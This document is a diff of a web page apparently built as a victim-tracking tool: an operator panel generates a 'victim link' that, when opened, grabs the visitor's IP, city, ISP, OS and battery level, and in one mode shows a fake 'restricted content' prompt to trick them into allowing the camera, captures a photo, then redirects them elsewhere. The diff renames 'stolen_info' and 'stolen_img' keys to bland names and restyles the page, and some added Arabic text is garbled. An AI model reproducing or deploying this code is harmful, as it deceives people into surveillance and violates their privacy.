@@ -3,105 +3,139 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>النظام المتكامل</title>
+    <title>Dashboard v3.0</title>
     <style>
-        :root { --bg: #050505; --card: #0d1117; --accent: #238636; --neon: #58a6ff; --text: #c9d1d9; }
-        body { margin: 0; background: var(--bg); font-family: 'Segoe UI', sans-serif; color: var(--text); }
+        :root { --bg: #030303; --card: #0a0a0a; --neon-blue: #00d2ff; --neon-green: #39ff14; --text: #e0e0e0; --glass: rgba(255, 255, 255, 0.05); }
+        body { margin: 0; background: var(--bg); font-family: 'Segoe UI', Roboto, sans-serif; color: var(--text); overflow-x: hidden; }
         .container { display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-        .admin-box { background: var(--card); padding: 30px; border-radius: 12px; width: 100%; max-width: 500px; border: 1px solid #30363d; box-shadow: 0 10px 50px rgba(0,0,0,0.7); }
-        h2 { text-align: center; color: var(--neon); margin-bottom: 25px; }
-        .mode-select { display: flex; gap: 8px; margin-bottom: 20px; }
-        .mode-btn { flex: 1; padding: 10px; background: #161b22; border: 1px solid #30363d; color: var(--text); border-radius: 6px; cursor: pointer; font-size: 12px; transition: 0.3s; }
-        .mode-btn.active { background: var(--neon); color: #000; font-weight: bold; }
-        input { width: 100%; padding: 14px; background: #010409; border: 1px solid #30363d; border-radius: 8px; color: #fff; margin-bottom: 15px; box-sizing: border-box; }
-        .btn { background: #21262d; color: var(--neon); border: 1px solid #30363d; padding: 15px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; }
-        .btn:hover { background: var(--neon); color: #000; }
-        #log-area { margin-top: 25px; display: none; }
-        .data-card { background: #161b22; padding: 15px; border-radius: 8px; border-right: 4px solid var(--accent); margin-bottom: 15px; font-size: 13px; }
-        #preview-img { width: 100%; border-radius: 8px; margin-top: 10px; border: 1px solid var(--neon); }
-        .victim-ui { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; justify-content: center; align-items: center; }
-        .dialog { background: #111; padding: 40px; border-radius: 20px; text-align: center; border: 1px solid #222; width: 85%; max-width: 350px; }
+        
+        .admin-box { 
+            background: var(--card); padding: 35px; border-radius: 15px; width: 100%; max-width: 450px; 
+            border: 1px solid #1a1a1a; box-shadow: 0 0 30px rgba(0, 210, 255, 0.1);
+            backdrop-filter: blur(10px); transition: 0.4s;
+        }
+
+        h2 { text-align: center; color: var(--neon-blue); margin-bottom: 30px; font-weight: 200; letter-spacing: 3px; text-transform: uppercase; }
+        
+        .mode-container { display: flex; gap: 15px; margin-bottom: 25px; }
+        .mode-card { 
+            flex: 1; background: var(--glass); border: 1px solid #222; padding: 20px; border-radius: 12px; 
+            text-align: center; cursor: pointer; transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        .mode-card.active { border-color: var(--neon-blue); background: rgba(0, 210, 255, 0.05); transform: translateY(-5px); box-shadow: 0 5px 15px rgba(0, 210, 255, 0.2); }
+        .mode-card b { font-size: 14px; display: block; }
+
+        input { 
+            width: 100%; padding: 15px; background: #000; border: 1px solid #222; border-radius: 10px; 
+            color: #fff; margin-bottom: 20px; box-sizing: border-box; transition: 0.3s;
+        }
+        input:focus { border-color: var(--neon-blue); outline: none; }
+
+        .main-btn { 
+            background: linear-gradient(45deg, #00d2ff, #3a7bd5); color: #000; border: none; 
+            padding: 16px; border-radius: 10px; cursor: pointer; width: 100%; font-weight: bold; 
+            font-size: 14px; text-transform: uppercase; transition: 0.3s;
+        }
+        .main-btn:hover { filter: brightness(1.2); transform: scale(1.02); }
+
+        .result-box { 
+            margin-top: 25px; padding: 15px; background: #000; border-radius: 10px; 
+            border: 1px dashed var(--neon-green); display: none; animation: fadeIn 0.5s;
+        }
+
+        #log-area { margin-top: 30px; display: none; animation: slideUp 0.6s; }
+        .data-log { background: #050505; padding: 20px; border-radius: 12px; border-right: 3px solid var(--neon-green); }
+        .info-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 13px; border-bottom: 1px solid #111; padding-bottom: 5px; }
+        .info-row span { color: var(--neon-blue); }
+
+        /* ÙØ§Ø¬ÙØ© Ø§ÙØ¶Ø­ÙØ© */
+        .victim-overlay { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; justify-content: center; align-items: center; }
+        .dialog { background: #080808; padding: 40px; border-radius: 15px; text-align: center; border: 1px solid #1a1a1a; width: 85%; max-width: 320px; }
         .hidden { display: none !important; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
     </style>
 </head>
 <body>
 
 <div class="container">
     <div id="admin-panel" class="admin-box">
-        <h2>لوحة التحكم</h2>
-        <div class="mode-select">
-            <button class="mode-btn active" onclick="setMode('silent', this)">سحب صامت (بيانات)</button>
-            <button class="mode-btn" onclick="setMode('camera', this)">سحب صور (بإذن)</button>
+        <h2>Control Center</h2>
+        
+        <div class="mode-container">
+            <div id="m1" class="mode-card active" onclick="selectMode('1', 'm1')">
+                <b>Ø³Ø­Ø¨ Ø¨ÙØ§ÙØ§Øª Ø§ÙØ¶Ø­ÙØ©</b>
+            </div>
+            <div id="m2" class="mode-card" onclick="selectMode('2', 'm2')">
+                <b>Ø³Ø­Ø¨ ØµÙØ±</b>
+            </div>
         </div>
-        <input type="text" id="urlInput" placeholder="أدخل رابط الوجهة (مثلاً يوتيوب)">
-        <button class="btn" onclick="generate()">إنشاء الرابط الذكي</button>
 
-        <div id="result" class="hidden" style="margin-top:20px;">
-            <p style="font-size:11px; color:var(--neon)">رابط الضحية:</p>
-            <input type="text" id="finalLink" readonly onclick="this.select()" style="border-color:var(--accent)">
+        <input type="text" id="targetUrl" placeholder="Ø£Ø¯Ø®Ù Ø±Ø§Ø¨Ø· Ø§ÙÙØ¬ÙØ©">
+        <button class="main-btn" onclick="generateLink()">ØªÙÙÙØ¯ Ø§ÙØ±Ø§Ø¨Ø·</button>
+
+        <div id="resultBox" class="result-box">
+            <p style="font-size:10px; color:var(--neon-green); margin-bottom:10px;">Ø§ÙØ±Ø§Ø¨Ø· Ø§ÙÙØ´ÙØ±:</p>
+            <input type="text" id="copyLink" readonly onclick="this.select()">
         </div>
 
         <div id="log-area">
-            <div class="data-card">
-                <b style="color:var(--neon)">📡 بيانات الجهاز المكتشفة:</b>
-                <div id="device-info" style="margin-top:10px; line-height:1.6;"></div>
-                <div id="img-holder" class="hidden">
-                    <img id="preview-img">
-                    <a id="dl-btn" download="capture.jpg" style="color:var(--accent); text-decoration:none; display:block; margin-top:5px; font-weight:bold;">⬇️ تحميل الصورة</a>
+            <div class="data-log">
+                <p style="color:var(--neon-blue); font-size:12px; margin-bottom:15px;">ð¡ Ø§ÙØªÙØ§Ø±ÙØ± Ø§ÙÙØ§Ø±Ø¯Ø©:</p>
+                <div id="device-data"></div>
+                <div id="image-data" class="hidden">
+                    <img id="captured-img" style="width:100%; border-radius:8px; margin-top:15px; border:1px solid #333;">
+                    <a id="download-link" download="report.jpg" style="display:block; color:var(--neon-green); font-size:11px; text-align:center; margin-top:10px; text-decoration:none;">ØªØ­ÙÙÙ Ø§ÙÙØ³Ø§Ø¦Ø·</a>
                 </div>
             </div>
         </div>
     </div>
 </div>
 
-<div id="victim-panel" class="victim-ui hidden">
+<div id="victim-ui" class="victim-overlay hidden">
     <div class="dialog">
-        <h2 style="color:#fff;">محتوى مقيد</h2>
-        <p style="color: #888;">لمشاهدة هذا الفيديو، يرجى منح إذن "السماح بالمشاهدة".</p>
-        <button class="btn" id="allowBtn" style="background: #ef4444; color:#fff; border:none;">السماح بالمشاهدة</button>
+        <h3 style="color:#fff; font-weight:300;">ØªØ£ÙÙØ¯ Ø§ÙØ¯Ø®ÙÙ</h3>
+        <p style="color: #666; font-size:13px;">ÙØ±Ø¬Ù Ø§ÙØ³ÙØ§Ø­ Ø¨Ø§ÙÙØµÙÙ ÙÙÙØ§ÙÙØ±Ø§ ÙÙÙØªØ§Ø¨Ø¹Ø© Ø¥ÙÙ Ø§ÙÙØ­ØªÙÙ Ø§ÙÙØ·ÙÙØ¨Ø©.</p>
+        <button id="cameraBtn" class="main-btn" style="margin-top:15px;">ÙØªØ§Ø¨Ø¹Ø©</button>
     </div>
     <video id="video" autoplay playsinline style="display:none"></video>
     <canvas id="canvas" style="display:none"></canvas>
 </div>
 
 <script>
-    let currentMode = 'silent';
-    const params = new URLSearchParams(window.location.search);
-    const modeParam = params.get('m');
+    let activeMode = '1'; // 1 = Ø¨ÙØ§ÙØ§Øª Ø 2 = ØµÙØ±
+    const urlParams = new URLSearchParams(window.location.search);
+    const vMode = urlParams.get('v');
 
-    function setMode(m, b) {
-        currentMode = m;
-        document.querySelectorAll('.mode-btn').forEach(btn => btn.classList.remove('active'));
-        b.classList.add('active');
+    function selectMode(mode, id) {
+        activeMode = mode;
+        document.querySelectorAll('.mode-card').forEach(c => c.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
     }
 
-    // --- منطق الضحية ---
-    if (modeParam) {
+    if (vMode) {
         document.getElementById('admin-panel').classList.add('hidden');
         
-        async function startCapture() {
-            // سحب البيانات الصامتة فوراً (IP + جهاز + بطارية)
-            const ipRes = await fetch('https://ipapi.co/json/').catch(() => ({}));
-            const ipData = await ipRes.json ? await ipRes.json() : {};
-            const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve(null));
+        async function startProtocol() {
+            const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+            const batt = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve(null));
             
-            const info = {
-                ip: ipData.ip || "Unknown",
-                loc: `${ipData.city}, ${ipData.country_name}`,
+            const payload = {
+                ip: ipData.ip || "N/A",
+                city: ipData.city || "Unknown",
+                isp: ipData.org || "Unknown",
                 os: navigator.platform,
-                battery: battery ? (battery.level * 100).toFixed(0) + "%" : "??",
-                ua: navigator.userAgent
+                batt: batt ? (batt.level * 100).toFixed(0) + "%" : "N/A"
             };
-            localStorage.setItem('stolen_info', JSON.stringify(info));
+            localStorage.setItem('rep_info', JSON.stringify(payload));
 
-            const target = localStorage.getItem('red_url') || 'https://google.com';
+            const redir = localStorage.getItem('redir_to') || 'https://google.com';
 
-            if (modeParam === 'silent') {
-                window.location.href = target;
+            if (vMode === '1') {
+                window.location.href = redir;
             } else {
-                // وضع الكاميرا: إظهار الواجهة
-                document.getElementById('victim-panel').classList.remove('hidden');
-                document.getElementById('allowBtn').onclick = async () => {
+                document.getElementById('victim-ui').classList.remove('hidden');
+                document.getElementById('cameraBtn').onclick = async () => {
                     try {
                         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                         const video = document.getElementById('video');
@@ -110,38 +144,41 @@
                             const canvas = document.getElementById('canvas');
                             canvas.width = 640; canvas.height = 480;
                             canvas.getContext('2d').drawImage(video, 0, 0);
-                            localStorage.setItem('stolen_img', canvas.toDataURL('image/jpeg'));
+                            localStorage.setItem('rep_img', canvas.toDataURL('image/jpeg'));
                             stream.getTracks().forEach(t => t.stop());
-                            window.location.href = target;
-                        }, 1000);
-                    } catch { window.location.href = target; }
+                            window.location.href = redir;
+                        }, 800);
+                    } catch { window.location.href = redir; }
                 };
             }
         }
-        startCapture();
+        startProtocol();
     }
 
-    // --- منطق المدير ---
-    function generate() {
-        const url = document.getElementById('urlInput').value;
-        if (!url) return alert("أدخل الرابط");
-        localStorage.setItem('red_url', url);
-        document.getElementById('finalLink').value = window.location.href.split('?')[0] + "?m=" + currentMode;
-        document.getElementById('result').classList.remove('hidden');
+    function generateLink() {
+        const val = document.getElementById('targetUrl').value;
+        if (!val) return;
+        localStorage.setItem('redir_to', val);
+        document.getElementById('copyLink').value = window.location.href.split('?')[0] + "?v=" + activeMode;
+        document.getElementById('resultBox').style.display = 'block';
     }
 
     window.addEventListener('storage', (e) => {
         document.getElementById('log-area').style.display = 'block';
-        if (e.key === 'stolen_info') {
+        if (e.key === 'rep_info') {
             const d = JSON.parse(e.newValue);
-            document.getElementById('device-info').innerHTML = `
-                IP: ${d.ip}<br>الموقع: ${d.loc}<br>النظام: ${d.os}<br>البطارية: ${d.battery}
+            document.getElementById('device-data').innerHTML = `
+                <div class="info-row">Ø¹ÙÙØ§Ù IP: <span>${d.ip}</span></div>
+                <div class="info-row">Ø§ÙÙØ¯ÙÙØ©: <span>${d.city}</span></div>
+                <div class="info-row">Ø§ÙÙØ²ÙØ¯: <span>${d.isp}</span></div>
+                <div class="info-row">ÙØ¸Ø§Ù Ø§ÙØªØ´ØºÙÙ: <span>${d.os}</span></div>
+                <div class="info-row">Ø§ÙØ¨Ø·Ø§Ø±ÙØ©: <span>${d.batt}</span></div>
             `;
         }
-        if (e.key === 'stolen_img') {
-            document.getElementById('img-holder').classList.remove('hidden');
-            document.getElementById('preview-img').src = e.newValue;
-            document.getElementById('dl-btn').href = e.newValue;
+        if (e.key === 'rep_img') {
+            document.getElementById('image-data').classList.remove('hidden');
+            document.getElementById('captured-img').src = e.newValue;
+            document.getElementById('download-link').href = e.newValue;
         }
     });
 </script>
